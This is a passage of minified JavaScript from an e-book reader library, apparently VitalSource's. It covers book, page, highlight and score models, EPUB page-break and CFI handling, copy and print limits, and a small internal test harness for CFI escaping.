        n.prototype.replaceObjectTag = function(e, t) {
            if (e) {
                null == t && (t = VST.document),
                e && e.jquery && (e = e[0]),
                t.jquery && (t = t[0]),
                el = t.createElement("iframe"),
                el.style.width = "100%",
                el.style.border = "none",
                el.setAttribute("allowtransparency", "true"),
                el.setAttribute("frameBorder", "0"),
                el.setAttribute("class", "vst-epub-binding"),
                el.onload = function() {
                    try {
                        this.style.height = d(this.contentDocument).height() + "px"
                    } catch (e) {}
                };
                var n = e.parentNode,
                    o = e.getAttribute("data"),
                    i = [];
                void 0 !== o && i.push("src=" + o),
                i.push("type=" + this.mediaType);
                for (var r = e.childNodes.length, a = 0; a < r; a++) {
                    var s = e.childNodes[a];
                    if ("param" === s.nodeName.toLowerCase()) {
                        var l = s.getAttribute("name"),
                            c = s.getAttribute("value");
                        l && c && i.push(l + "=" + c)
                    }
                }
                var u = 0 < i.length ? "?" + i.join("&") : "";
                return el.setAttribute("src", this.href + u), n.replaceChild(el, e), el
            }
        };
        var o = function(e) {
            this.bindings = e || [];
            for (var t = this.bindings.length - 1; 0 <= t; t--)
                this.bindings[t].render || (this.bindings[t] = new n(this.bindings[t].mediaType, this.bindings[t].href));
            this.bindingsMap = {},
            this.length = e.length;
            for (t = this.bindings.length - 1; 0 <= t; t--)
                this.bindingsMap[this.bindings[t].mediaType] = this.bindings[t]
        };
        o.prototype.findBinding = function(e) {
            return this.bindingsMap[e]
        },
        o.prototype.render = function(e) {
            null == e && (e = VST.document);
            for (var t = e.getElementsByTagName("object"), n = t.length - 1; 0 <= n; n--) {
                var o = this.findBinding(t[n].getAttribute("type"));
                void 0 !== o && o.render(e, t[n])
            }
            VST.fire("bindings:render")
        },
        VST.Models.Binding = n,
        VST.Models.BindingsCollection = o
    }.call(window, t),
    function(p) {
        function r(e) {
            this.pageBreakList = e,
            this.index = 0
        }
        VST.Models.Book = function(e) {
            e = e || {},
            VST.Logger.debug("here is what we know about the book: ", e);
            var t,
                i = e.isbn,
                n = e.author,
                o = e.title,
                r = e.copyLimit,
                a = e.printLimit,
                s = e.format || e.vbkType || "epub",
                l = e.hasPageBreaks || !1,
                c = e.isFixedLayout || !1,
                u = (e.layout, e.pathPrefix || "/books"),
                d = e.apiPathPrefix || "/books",
                f = function(e) {
                    return 0 <= (e = (e = e.replace(/^([^\/])/, function(e) {
                        return "/" + e
                    })).replace(/\/+$/, "")).indexOf(":isbn") ? e.replace(":isbn", i) : [e, i].join("/")
                };
            u = f(u),
            d = f(d),
            this.getISBN = function() {
                return i
            },
            this.getAuthor = function() {
                return n
            },
            this.getTitle = function() {
                return o
            },
            this.getPathPrefix = function() {
                return u
            },
            this.dashlessISBN = function() {
                return this.getISBN().replace(/-/g, "")
            },
            this.hasPageBreaks = function() {
                return l
            },
            this.isFixedLayout = function() {
                return c
            },
            this.hasCopyLimit = function() {
                return 0 <= this.getCopyLimit()
            },
            this.getCopyLimit = function() {
                return void 0 === r ? 0 : parseInt(r)
            },
            this.hasPrintLimit = function() {
                return 0 <= this.getPrintLimit()
            },
            this.getPrintLimit = function() {
                return void 0 === a ? 0 : parseInt(a)
            },
            this.isEpub = function() {
                return /epub/i.test(s)
            },
            this.isPBK = function() {
                return /^p/i.test(s)
            },
            this.isDash = function() {
                return /dash/i.test(s)
            },
            this.getFormat = function() {
                return s
            },
            this.renderBindings = function(e) {
                return t.render(e)
            },
            this.getBindings = function() {
                return t
            },
            this.setFixedLayout = function(e) {
                c = e
            },
            this.getViewportDimensions = function(e) {
                null == e && (e = VST.document);
                var t = (e = p(e)).find("meta[name=viewport]");
                if (0 != t.length) {
                    var n = t.attr("content"),
                        o = n.match(/height=(\d+)/),
                        i = n.match(/width=(\d+)/);
                    return o && i ? {
                        height: parseInt(o[1], 10),
                        width: parseInt(i[1], 10)
                    } : void 0
                }
            },
            this.setFixedLayoutIFrameDimensions = function(e) {
                if (!VST.Book.isPBK() && this.isFixedLayout()) {
                    var t = document.getElementsByTagName("iframe"),
                        n = document.getElementById("epub-container");
                    if (!(t.length < 2)) {
                        for (var o = "0px", i = 0; i < t.length; i++) {
                            e = t[i].contentDocument;
                            var r = this.getViewportDimensions(e),
                                a = parseInt(p(e.body).css("marginLeft")),
                                s = parseInt(p(e.body).css("marginRight"));
                            if (p(e.body).css("overflow-x", "hidden"), r) {
                                var l = r.width + a + s + "px";
                                t[i].width = l,
                                t[i].style.left = o;
                                var c = r.height + "px";
                                t[i].height = c,
                                o = l
                            }
                        }
                        n.style.width = "100vw",
                        n.style.overflow = "auto"
                    }
                }
            },
            this.setFixedLayoutDimensions = function(e) {
                var t = this.getViewportDimensions(e);
                if (t) {
                    var n = t.height,
                        o = t.width,
                        i = e.find("html"),
                        r = e.find("body");
                    if (0 == r.length || "" != r[0].style.width || "" != r[0].style.height)
                        return;
                    i.css({
                        overflow: "auto"
                    }),
                    r.css({
                        overflow: "hidden",
                        height: n + "px",
                        width: o + "px"
                    })
                }
            },
            this.setBindings = function(e) {
                t = new VST.Models.BindingsCollection(e)
            };
            var h = function(e, t) {
                var n = e.replace(/^\//, ""),
                    o = t.replace(/^\//, "");
                return 0 === n.indexOf(o) || 0 <= n.indexOf("books/" + i) ? e : [t, n].join("/")
            };
            this.buildURL = function(e) {
                return h(e, u)
            },
            this.buildContentURL = this.buildURL,
            this.buildAPIURL = function(e) {
                return h(e, d)
            },
            this.setBindings(e.bindings || []),
            l && this.setupPageBreaks()
        },
        VST.Models.Book.prototype.getTOC = function(e) {
            VST.EventDispatcher.trigger("book:getTOC:before"),
            VST.Handler.fire("book:getTOC", e, this)
        },
        VST.Models.Book.prototype.setPages = function(e) {
            this.pages = e
        },
        VST.Models.Book.prototype.getPages = function(e) {
            VST.EventDispatcher.trigger("book:getPages:before"),
            VST.Handler.fire("book:getPages", e, this)
        },
        VST.Models.Book.prototype.getCurrentPageURL = function() {
            return VST.EventDispatcher.trigger("book:getCurrentPageURL:before"), VST.Handler.fire("book:getCurrentPageURL")
        },
        VST.Models.Book.prototype.goToNextPage = function(e) {
            VST.EventDispatcher.trigger("book:goToNextPage:before"),
            VST.Handler.fire("book:goToNextPage", e, this)
        },
        VST.Models.Book.prototype.goToPreviousPage = function(e) {
            VST.EventDispatcher.trigger("book:goToPreviousPage:before"),
            VST.Handler.fire("book:goToPreviousPage", e, this)
        },
        VST.Models.Book.prototype.getNextPage = function(e) {
            VST.EventDispatcher.trigger("book:getNextPage:before"),
            VST.Handler.fire("book:getNextPage", e, this)
        },
        VST.Models.Book.prototype.getPageBreaks = function(e) {
            VST.EventDispatcher.trigger("book:getPageBreaks:before"),
            VST.Handler.fire("book:getPageBreaks", e, this)
        },
        VST.Models.Book.prototype.sendActivityData = function(e, t) {
            VST.Handler.fire("book:sendActivityData", [e, t], this)
        },
        VST.Models.Book.prototype.retrieveActivityData = function(e, t) {
            VST.Handler.fire("book:retrieveActivityData", [e, t], this)
        },
        VST.Models.Book.prototype.reportScores = function(e, t) {
            if (VST.Utils.isArray(e))
                for (var n = e.length - 1; 0 <= n; n--)
                    e[n] = new VST.Models.Score(e[n]);
            else
                e = new VST.Models.Score(e);
            VST.Handler.fire("book:reportScores", [e, t], this)
        },
        VST.Models.Book.prototype.reportScore = VST.Models.Book.prototype.reportScores,
        VST.Models.Book.prototype.getScores = function(e, o) {
            var t = function(e, t) {
                if (t && t.length)
                    for (var n = t.length - 1; 0 <= n; n--)
                        t[n] = new VST.Models.Score(t[n]);
                o(e, t)
            };
            VST.Handler.fire("book:getScores", [e, t], this)
        },
        VST.Models.Book.prototype.getScore = VST.Models.Book.prototype.getScores,
        VST.Models.Book.prototype.hideTOC = function(e) {
            VST.EventDispatcher.trigger("book:hideTOC:before"),
            VST.Handler.fire("book:hideTOC", e, this)
        },
        VST.Models.Book.prototype.showTOC = function(e) {
            VST.EventDispatcher.trigger("book:showTOC:before"),
            VST.Handler.fire("book:showTOC", e, this)
        },
        VST.Models.Book.prototype.getPreviousPage = function(e) {
            VST.EventDispatcher.trigger("book:getPreviousPage:before"),
            VST.Handler.fire("book:getPreviousPage", e, this)
        },
        VST.Models.Book.prototype.getNextPageURL = function(e) {
            VST.EventDispatcher.trigger("book:getNextPageURL:before"),
            VST.Handler.fire("book:getNextPageURL", e, this)
        },
        VST.Models.Book.prototype.getPreviousPageURL = function(e) {
            VST.EventDispatcher.trigger("book:getPreviousPageURL:before"),
            VST.Handler.fire("book:getPreviousPageURL", e, this)
        },
        VST.Models.Book.prototype.getCurrentPage = function(e) {
            VST.EventDispatcher.trigger("book:getCurrentPage:before"),
            VST.Handler.fire("book:getCurrentPage", e, this)
        },
        VST.Models.Book.prototype.getCurrentPages = function(e) {
            VST.EventDispatcher.trigger("book:getCurrentPages:before"),
            VST.Handler.fire("book:getCurrentPages", e, this)
        },
        VST.Models.Book.prototype.hasNextPage = function(e) {
            VST.Handler.fire("book:hasNextPage", e, this)
        },
        VST.Models.Book.prototype.hasPreviousPage = function(e) {
            VST.Handler.fire("book:hasPreviousPage", e, this)
        },
        VST.Models.Book.prototype.contentDocForCFI = function(i, r) {
            r && this.getPages(function(e, t) {
                var n;
                if (t && t.length) {
                    for (var o = t.length - 1; 0 <= o; o--)
                        if (result = VST.Utils.compareCFIs(i, t[o].getCFI()), result === VST.Utils.GREATER_THAN || result === VST.Utils.EQUAL) {
                            n = t[o];
                            break
                        }
                    r(null, n)
                } else
                    r(new VST.Error("No pages found"))
            })
        },
        VST.Models.Book.prototype.pageForCFI = function(e, t) {
            var n = function(e) {
                    return e.getAttribute("title") || e.textContent || e.innerText
                },
                o = "";
            if (!e || !e.indexOf)
                return null;
            if (this.pageBreakList) {
                for (var i = this.pageBreakList.length - 1; 0 <= i; i--) {
                    var r = this.pageBreakList[i].cfi || "";
                    if ((l = VST.Utils.compareCFIs(e, r)) === VST.Utils.GREATER_THAN || l === VST.Utils.EQUAL)
                        return this.pageBreakList[i]
                }
                return null
            }
            -1 !== e.indexOf("!") && (o = t + "!");
            for (var a, s, l, c = this.createPageBreakIterator(VST.document); a = c.nextNode();) {
                if (r = o + (VST.sharedEpubModule.GetCFIForNode(a) || ""), (l = VST.Utils.compareCFIs(e, r)) === VST.Utils.LESS_THAN)
                    return s ? {
                        title: n(c.previousNode()),
                        cfi: s
                    } : {
                        title: n(a),
                        cfi: r
                    };
                if (l === VST.Utils.EQUAL)
                    return {
                        title: n(a),
                        cfi: r
                    };
                s = r
            }
            return l === VST.Utils.GREATER_THAN ? {
                title: n(c.previousNode()),
                cfi: s
            } : null
        },
        VST.Models.Book.prototype.getHighlights = function(e) {
            VST.EventDispatcher.trigger("book:getHighlights:before"),
            VST.Handler.fire("book:getHighlights", e, this)
        },
        VST.Models.Book.prototype.clearSelection = function() {
            var e = VST.window || window,
                t = VST.document || document;
            t.selection && t.selection.empty ? t.selection.empty() : e.getSelection && e.getSelection().removeAllRanges(),
            VST.fire("book:selectionCancelled")
        },
        VST.Models.Book.prototype.setupPageBreaks = function() {
            this.hasPageBreaks() && !this.hasEPUB3PagebreakAttributes() && this.getPageBreaks(null)
        },
        VST.Models.Book.prototype.hasEPUB3PagebreakAttributes = function() {
            var e = VST.document || document,
                t = this.createPageBreakIterator(e);
            return t && null != t.nextNode()
        },
        VST.Models.Book.prototype.setPageBreaks = function(e) {
            this.pageBreakList = e
        };
        var a = function(e) {
            this.currentNode = e;
            for (var t = -1, n = [], o = function(e) {
                    if (!e || 1 !== e.nodeType)
                        return !1;
                    for (var t = e.attributes.length - 1; 0 <= t; t--)
                        if ("epub:type" == e.attributes[t].nodeName && "pagebreak" == e.attributes[t].nodeValue)
                            return !0;
                    return !1
                }, i = this.currentNode.getElementsByTagName("*"), r = 0; r < i.length; r++)
                o(i[r]) && n.push(i[r]);
            this.nextNode = function() {
                return VST.Logger.debug("IE next node called"), t < n.length - 1 ? (t++, this.currentNode = n[t], this.currentNode) : void 0
            },
            this.previousNode = function() {
                return t < 0 ? null : 0 == t ? (t--, this.currentNode = e, null) : (t--, this.currentNode = n[t], n[t + 1])
            }
        };
        r.prototype.doFindNodeForEntry = function(e) {
            var t = (VST.window || window, VST.document || document),
                n = null;
            if (e.cfi)
                (o = VST.sharedEpubModule.locateCFI(e.cfi)) && (n = o.node);
            else if (e.fragment) {
                if (/^epubcfi/.test(fragment)) {
                    var o,
                        i = fragment.slice(8, fragment.length - 1);
                    (o = VST.sharedEpubModule.locateCFI(i)) && (n = o.node)
                } else if (!(n = t.getElementById(decodeURIComponent(fragment)))) {
                    var r = t.getElementsByName(fragment);
                    0 < r.length && (n = r[0])
                }
            } else
                n = t.body;
            return n
        },
        r.prototype.findNode = function(e) {
            var t = this.pageBreakList[e];
            return t.node || (t.node = this.doFindNodeForEntry(t)), t
        },
        r.prototype.titleForNode = function(e) {
            var t = this.index;
            for (t >= this.pageBreakList.length && (t = this.pageBreakList.length - 1); 0 <= t; --t) {
                if ((o = this.pageBreakList[t]).node == e)
                    return o.title
            }
            var n = this.pageBreakList.length;
            for (t = this.index; t < n; ++t) {
                var o;
                if ((o = this.pageBreakList[t]).node == e)
                    return o.title
            }
            return null
        },
        r.prototype.nextNode = function() {
            if (this.index >= this.pageBreakList.length)
                return null;
            var e = this.findNode(this.index);
            return ++this.index, e.node
        },
        VST.Models.Book.prototype.createPageBreakIterator = function(e, t) {
            var n = t || e.body;
            if (!o)
                var o = {
                    SHOW_ELEMENT: 1,
                    FILTER_ACCEPT: 1,
                    FILTER_REJECT: 2,
                    FILTER_SKIP: 3
                };
            if (e.createNodeIterator)
                var i = e.createNodeIterator(n, o.SHOW_ELEMENT, function(e) {
                    return "pagebreak" == e.getAttributeNS("http://www.idpf.org/2007/ops", "type") ? o.FILTER_ACCEPT : o.FILTER_REJECT
                }, !1);
            else
                i = new a(n);
            return this.pageBreakList && (null != i.nextNode() ? i.previousNode() : i = new r(this.pageBreakList)), this.pageBreakIterator = i
        },
        VST.Models.Book.prototype.isSelectionTooLong = function(e) {
            var t = VST.window || window,
                n = VST.document || document,
                o = VST.Settings.wordsPerPage * e,
                i = VST.Utils.getSelectionObject();
            if (this.hasPageBreaks() && t.getSelection && i && !i.isCollapsed && 0 < i.rangeCount) {
                for (var r = i.getRangeAt(0), a = r.commonAncestorContainer, s = this.createPageBreakIterator(n, a), l = 0, c = null, u = r.cloneRange(); c = s.nextNode();)
                    if (u.selectNode(c), r.compareBoundaryPoints(Range.START_TO_START, u) <= 0 && 0 < r.compareBoundaryPoints(Range.START_TO_END, u) && e < ++l)
                        return !0;
                return !1
            }
            return VST.Utils.getSelectedText().split(/\s+/).length > o
        },
        VST.Models.Book.prototype.isSelectionTooLongForCopy = function() {
            if (!this.hasCopyLimit())
                return !1;
            var e = this.getCopyLimit();
            return 0 == e || this.isSelectionTooLong(e)
        },
        VST.Models.Book.prototype.limitSelection = function(e, t) {
            var n = VST.window || window,
                o = VST.document || document,
                i = VST.Settings.wordsPerPage * e,
                r = VST.Utils.getSelectionObject(),
                a = VST.Utils.getRangeObject();
            if (this.hasPageBreaks()) {
                if (!n.getSelection) {
                    var s = this.createPageBreakIterator(o),
                        l = o.body.createTextRange(),
                        c = VST.Utils.getSelectionObject(),
                        u = 0;
                    for (r.collapse(!0); f = s.nextNode();)
                        if (l.moveToElementText(f), r.compareEndPoints("StartToStart", l) <= 0) {
                            for (u++; r.compareEndPoints("EndToStart", l) < 0 && r.compareEndPoints("EndToEnd", c) < 0;)
                                r.moveEnd("sentence", 1);
                            for (; 1 === r.compareEndPoints("EndToEnd", c) || 1 === r.compareEndPoints("EndToEnd", l);)
                                r.moveEnd("word", -1);
                            if (e < u)
                                break
                        }
                    return this.clearSelection(), r.select(), window.select = r, window.iter = s, r.text
                }
                if (r && !r.isCollapsed && 0 < r.rangeCount) {
                    var d = 0,
                        f = null,
                        h = a.cloneRange(),
                        p = a.commonAncestorContainer;
                    for (s = this.createPageBreakIterator(o, p); f = s.nextNode();)
                        if (f.ownerDocument === o && (h.selectNode(f), a.compareBoundaryPoints(Range.START_TO_START, h) <= 0 && 0 < a.compareBoundaryPoints(Range.START_TO_END, h) && e < ++d)) {
                            (a = a.cloneRange()).setEndBefore(f);
                            break
                        }
                    return r.removeAllRanges(), r.addRange(a), r.toString()
                }
            } else {
                if (VST.Utils.getSelectedText().split(/\s+/).length <= i)
                    VST.Logger.debug("acceptable " + t + " length");
                else if (VST.Logger.debug(t + " text too long"), (r = VST.Utils.getSelectionObject()).collapseToStart && r.modify) {
                    r.collapseToStart();
                    for (var g = 0; g < i; g++)
                        r.modify("extend", "forward", "word")
                } else
                    r.collapse(!0),
                    r.moveEnd("word", i),
                    this.clearSelection(),
                    r.select()
            }
            return r.toString ? r.toString() : r.text
        },
        VST.Models.Book.prototype.handleCopy = function(e) {
            var t = this.getCopyLimit();
            return 0 == t ? (VST.trigger("book:no-copy"), VST.Logger.debug("copy not allowed"), e && e.preventDefault(), !1) : (this.hasCopyLimit() && this.limitSelection(t, "copy"), this.appendBibliography(), !0)
        },
        VST.Models.Book.prototype.setBibliographicHTML = function(e) {
            this.bibliographicInfo = e
        },
        VST.Models.Book.prototype.appendBibliographyHTML = function(e) {
            var t = VST.window || window,
                n = VST.document || document,
                o = t.getSelection();
            if (o && !o.isCollapsed && 0 < o.rangeCount) {
                if (0 < p("#vst_newcopyelement_temp").length)
                    return;
                var i = o.getRangeAt(0),
                    r = p('<div id="vst_newcopyelement_temp" style="overflow:hidden;color:#000000;backgroundColor:transparent;textAlign:left;textDecoration:none;width:0.1;height:0.1"></div>', n);
                p(i.cloneContents()).appendTo(r),
                p("<div>" + e + "</div>", n).appendTo(r),
                r.appendTo(p(n.body));
                var a = n.createRange(),
                    s = r.get(0);
                a.selectNode(s),
                o.removeAllRanges(),
                o.addRange(a),
                t.setTimeout(function() {
                    s.parentNode.removeChild(s);
                    var e = t.getSelection();
                    e.removeAllRanges(),
                    e.addRange(i)
                }, 0)
            }
        },
        VST.Models.Book.prototype.appendBibliography = function() {
            if (this.bibliographicInfo && 0 < this.bibliographicInfo.length)
                this.appendBibliographyHTML(this.bibliographicInfo);
            else {
                var e = VST.sharedEpubModule.GetCFIRangeStringForSelection(),
                    t = VST.Handler.fire("book:getBibliographyHTML", e, this);
                t && 0 < t.length && this.appendBibliographyHTML(t)
            }
        },
        VST.Models.Book.prototype.getPrintXMLForRange = function(e) {
            var t = (VST.window || window, VST.document || document),
                n = null;
            if (e.cloneContents) {
                var o = e.cloneContents(),
                    i = t.createElement("html");
                t.head && i.appendChild(t.head.cloneNode(!0));
                var r = t.body.cloneNode(!1);
                r.appendChild(o),
                i.appendChild(r);
                var a = p.browser.msie ? "opacity:0.001;background-color:rgb(255,255,255);" : "",
                    s = p('<style type="text/css" media="print">#printUIBlocker { display:none; } </style>'),
                    l = p('<iframe class="printUIBlocker" style="z-index:1000;border:none;margin:0;padding:0;position:absolute;width:100%;height:100%;top:0;left:0;opacity:0.0;" src="about:blank"></iframe>'),
                    c = p('<div class="printUIBlocker" style="z-index:1001;border:none;margin:0;padding:0;width:100%;height:100%;top:0;left:0;position:fixed;' + a + '"></div>'),
                    u = p(r);
                s.appendTo(u),
                l.appendTo(u),
                c.appendTo(u),
                p(i).find("script").remove(),
                n = (new XMLSerializer).serializeToString(i)
            }
            return n
        },
        VST.Models.Book.prototype.getPrintXMLForSelection = function() {
            var e = VST.window || window,
                t = VST.document || document,
                n = this.getPrintLimit();
            if (0 == n)
                return VST.log("print not allowed"), null;
            if (this.hasPrintLimit() && this.limitSelection(n, "print"), e.getSelection) {
                var o = e.getSelection();
                if (o && !o.isCollapsed && 0 < o.rangeCount) {
                    var i = o.getRangeAt(0);
                    return this.getPrintXMLForRange(i)
                }
            } else if (t.selection) {
                var r = t.selection.createRange();
                return this.getPrintXMLForRange(r)
            }
            return null
        },
        VST.Models.Book.prototype.getPrintXMLForPageRange = function(e, t) {
            var n = (VST.window || window, VST.document || document),
                o = n.createRange();
            if (o.selectNodeContents(n.body), t <= e && 0 <= t)
                return null;
            if (0 == e && (e = -1), 0 <= e || 0 <= t)
                for (var i = this.createPageBreakIterator(n), r = null, a = 0; (r = i.nextNode()) && !(a == e && (o.setStartBefore(r), t < 0));) {
                    if (a == t) {
                        o.setEndBefore(r);
                        break
                    }
                    ++a
                }
            return this.getPrintXMLForRange(o)
        },
        VST.Models.Book.prototype.getPrintSetupInfo = function() {
            var e = VST.window || window,
                t = VST.document || document,
                n = {
                    pageBreaks: new Array,
                    currentPageIndex: 0,
                    hasSelection: !1,
                    selectionStartIndex: null,
                    selectionEndIndex: null,
                    error: null
                };
            try {
                var o = this.createPageBreakIterator(t);
                this.hasPrintLimit() && this.limitSelection(this.getPrintLimit(), "print");
                var i = null;
                if (e.getSelection) {
                    var r = e.getSelection();
                    r && !r.isCollapsed && 0 < r.rangeCount && (i = r.getRangeAt(0), n.selectionStartIndex = 0, n.selectionEndIndex = 0, n.hasSelection = !0)
                }
                var a = null,
                    s = VST.sharedEpubModule.FindDOMNodeAndOffsetIntersectingViewportRect(t.body, {
                        top: 0,
                        left: 0,
                        bottom: 10,
                        right: e.innerWidth
                    }),
                    l = null;
                s && ((l = t.createRange()).setStart(t.body, 0), l.setEnd(s.node, s.offset));
                for (var c = 0, u = t.createRange(); a = o.nextNode();) {
                    u.selectNode(a),
                    l && l.compareBoundaryPoints(Range.START_TO_START, u) <= 0 && 0 < l.compareBoundaryPoints(Range.START_TO_END, u) && (n.currentPageIndex = c),
                    i && (u.compareBoundaryPoints(Range.START_TO_START, i) <= 0 ? (n.selectionStartIndex = c, n.selectionEndIndex = c) : u.compareBoundaryPoints(Range.END_TO_START, i) < 0 && (n.selectionEndIndex = c)),
                    ++c;
                    var d = null;
                    o.titleForNode ? d = o.titleForNode(a) : (d = a.getAttribute("title")) || (d = a.textContent),
                    n.pageBreaks.push(d)
                }
            } catch (f) {
                n.error = f.message
            }
            return JSON.stringify(n)
        }
    }.call(window, t),
    function(i) {
        VST.Models.Highlight = function(e) {
            var t = (e = e || {}).book,
                n = e.offset,
                o = e.selectedText,
                i = e.cfi || e.CFI;
            e.id || e.sync_id,
            e.color,
            this.getBook = function() {
                return t
            },
            this.getOffset = function() {
                return n
            },
            this.getCFI = function() {
                return i
            },
            this.getSelectedText = function() {
                return o
            }
        },
        VST.Models.Highlight.Settings = {
            highlightClass: "vsthighlight",
            noteIconClass: "vstnoteindicator",
            emojiWrapperClass: "vstemojiwrapper vsthighlight vstnoteindicator vstskip vstignore"
        },
        VST.Models.Highlight.init = function(e, t) {
            null == t && (t = document),
            null == e && (e = window),
            this.setupEventHandlers(e, t)
        },
        VST.Models.Highlight.setupEventHandlers = function(e, t) {
            this.watchForSelection(e, t),
            this.watchHovers(e, t),
            this.watchForHighlightClicks(e, t)
        },
        VST.Models.Highlight.watchHovers = function(e, t) {
            var n = "." + VST.Models.Highlight.Settings.highlightClass;
            i(t).delegate(n, "mouseover", function(e) {
                VST.fire(VST.Event.fromjQueryEvent("highlight:mouseover", e), this)
            }).delegate(n, "mouseout", function(e) {
                VST.fire(VST.Event.fromjQueryEvent("highlight:mouseout", e), this)
            })
        },
        VST.Models.Highlight.watchForHighlightClicks = function(e, t) {
            var n = "." + VST.Models.Highlight.Settings.highlightClass,
                o = function(e) {
                    return i(e).hasClass(VST.Models.Highlight.Settings.noteIconClass) ? "noteicon:click" : "highlight:click"
                };
            navigator.epubReadingSystem && navigator.epubReadingSystem.isDesktop() ? i(t).delegate(n, "dblclick", function(e) {
                VST.Book.clearSelection(),
                VST.fire(VST.Event.fromjQueryEvent(o(this), e), this)
            }) : i(t).delegate(n, "click", function(e) {
                VST.fire(VST.Event.fromjQueryEvent(o(this), e), this)
            })
        },
        VST.Models.Highlight.makeHighlightFromSelection = function(e) {
            VST.Handler.fire("highlight:makeHighlightFromSelection", e, this)
        },
        VST.Models.Highlight.defaultSelectionHandler = function(t, n) {
            var o;
            n = n || {},
            setTimeout(function() {
                var e = VST.Utils.getSelectedText();
                "" === e ? (o = VST.Event.fromjQueryEvent("book:selectionCancelled", t, n), VST.EventDispatcher.fire(o)) : (o = VST.Event.fromjQueryEvent("book:selectionMade", t, n), VST.EventDispatcher.fire(o, e))
            }, 10)
        },
        VST.Models.Highlight.watchForSelection = function(e, t) {
            var n,
                o = VST.Handler.get("selection", this.defaultSelectionHandler);
            i(t).delegate("body", "mouseup", function(e) {
                clearTimeout(n),
                o(e, {
                    originalEventType: "mouseup"
                })
            }),
            i(t).keyup(function(e) {
                o(e, {
                    originalEventType: "keyup"
                })
            }),
            "ontouchstart" in e && i(t).bind("selectionchange", function(e) {
                n && clearTimeout(n),
                n = setTimeout(function() {
                    o(e, {
                        originalEventType: "selectionchange"
                    })
                }, 500)
            })
        }
    }.call(window, t),
    function() {
        VST.Models.Page = function(e) {
            var t = (e = e || {}).title || e.page,
                n = e.path,
                o = e.url,
                i = e.linear,
                r = e.cfi,
                a = e.index || e.number,
                s = e.cfiWithoutAssertions,
                l = e.layout,
                c = e.spread,
                u = e.orientation,
                d = e.pageSpread,
                f = e.chapterTitle,
                h = document.createElement("a");
            h.href = n;
            var p = h.pathname
            ;
            o && (h.href = o, o = h.pathname),
            /^\//.test(p) || (p = "/" + p),
            /^\//.test(o) || (o = "/" + o),
            this.getPath = function() {
                return p
            },
            this.getURL = function() {
                return o
            },
            this.getTitle = function() {
                return t
            },
            this.getCFI = function() {
                return r
            },
            this.isLinear = function() {
                return null == i || i
            },
            this.getIndex = function() {
                return a
            },
            this.getCFIWithoutAssertions = function() {
                return s
            },
            this.getLayout = function() {
                return l
            },
            this.getSpread = function() {
                return c
            },
            this.getOrientation = function() {
                return u
            },
            this.getPageSpread = function() {
                return d
            },
            this.getChapterTitle = function() {
                return f
            }
        }
    }.call(window, t),
    function() {
        var e = function(e) {
            for (key in null == e && (e = {}), e)
                this[key] = e[key];
            if ("undefined" != typeof this.location && (this.location = this.location + ""), "undefined" == typeof this.timestamp) {
                var t,
                    n = new Date;
                t = n.toISOString ? n.toISOString() : n.valueOf(),
                this.timestamp = t
            }
            for (var o = ["score", "maxscore"], i = o.length - 1; 0 <= i; i--) {
                var r = o[i];
                this[r] = Number(this[r]),
                isNaN(this[r]) && (this[r] = 0)
            }
        };
        VST.Models.Score = e
    }.call(window, t),
    function() {
        VST.Models.User = function() {},
        VST.Models.User.prototype.hasBook = function(e, t) {
            VST.Handler.fire("user:hasBook", [e, t], this)
        },
        VST.Models.User.prototype.getFirstName = function(e) {
            VST.EventDispatcher.fireBefore("user:getFirstName"),
            VST.Handler.fire("user:getFirstName", e, this)
        },
        VST.Models.User.prototype.getLastName = function(e) {
            VST.EventDispatcher.fireBefore("user:getLastName"),
            VST.Handler.fire("user:getLastName", e, this)
        },
        VST.Models.User.prototype.getFullName = function(e) {
            VST.EventDispatcher.fireBefore("user:getFullName"),
            VST.Handler.fire("user:getFullName", e, this)
        },
        VST.Models.User.prototype.getInfo = function(e) {
            VST.Handler.fire("user:getInfo", e, this)
        },
        VST.Models.User.prototype.books = function(e, t) {
            VST.EventDispatcher.fireBefore("user:getBooks"),
            VST.Handler.fire("user:books", [e, t], this)
        },
        VST.Models.User.prototype.getBooks = VST.Models.User.prototype.books,
        VST.Models.User.prototype.getScoreURL = function(e) {
            VST.EventDispatcher.fireBefore("user:getScoreURL"),
            VST.Handler.fire("user:getScoreURL", e, this)
        },
        VST.User = new VST.Models.User
    }.call(window, t)
}.call(this, $),
VST.$ = $.noConflict(!0);
var VSTEPUBModule = function(window, document) {
        function logMessage(e) {
            "undefined" != typeof VST && VST.Logger.info(e)
        }
        function logError(e) {
            "undefined" != typeof VST && VST.Logger.error(e)
        }
        function EscapeCFIAssertion(e) {
            return e.replace(/[\[\]\^\(\)\,\;]/g, "^$&")
        }
        function UnescapeCFIAssertion(e) {
            return e.replace(/\^([\[\]\^\(\)\,\;])/g, "$1")
        }
        function ParseCFIAssertion(e) {
            if ("[" != e.charAt(0))
                return null;
            var t = e.search(/[^\^]\]/);
            return -1 == t ? null : {
                endOffset: t + 2,
                assert: UnescapeCFIAssertion(e.slice(1, t + 1))
            }
        }
        function StripCFIAssertions(e) {
            return e.replace(/\[(.*?)[^\^]\]/g, "")
        }
        function CreateNextNodeRegex() {
            return new RegExp("(?:\\/(\\d+))(?:(?:\\[(.*?[^\\^])\\])?)|(?:!)|(?:\\:(\\d+))|(?:@([\\d.]+):([\\d.]+))", "g")
        }
        function TestCommand(command, expectedResult, testResults) {
            var cmdObject = null;
            cmdObject = "string" == typeof command ? {
                test: function() {
                    return eval(command)
                },
                title: command
            } : command;
            var result = cmdObject.test(),
                success = !0;
            if ("string" == typeof expectedResult)
                result != expectedResult ? (testResults.TestFail("Test " + cmdObject.title + " failed", expectedResult, result), success = !1) : (logMessage(cmdObject.title + " returned " + result + " as expected - YAY!"), testResults.TestSuccess());
            else
                for (expectedKey in expectedResult) {
                    var test = cmdObject.title + "." + expectedKey,
                        actual = result[expectedKey],
                        expected = expectedResult[expectedKey];
                    actual != expected ? (testResults.TestFail("Test " + test + " failed", expected, actual), success = !1) : (logMessage(test + " returned " + actual + " as expected - YAY!"), testResults.TestSuccess())
                }
            return success
        }
        function TestResults() {
            this.successCount = 0,
            this.failCount = 0,
            this.messages = []
        }
        function TestCFIAssertionUtilities(e) {
            TestCommand('EscapeCFIAssertion("abcd1234");', "abcd1234", e),
            TestCommand('EscapeCFIAssertion("test[some]^weird;(stuff),");', "test^[some^]^^weird^;^(stuff^)^,", e),
            TestCommand('UnescapeCFIAssertion("abcd1234");', "abcd1234", e),
            TestCommand('UnescapeCFIAssertion("test^[some^]^^weird^;^(stuff^)^,");', "test[some]^weird;(stuff),", e),
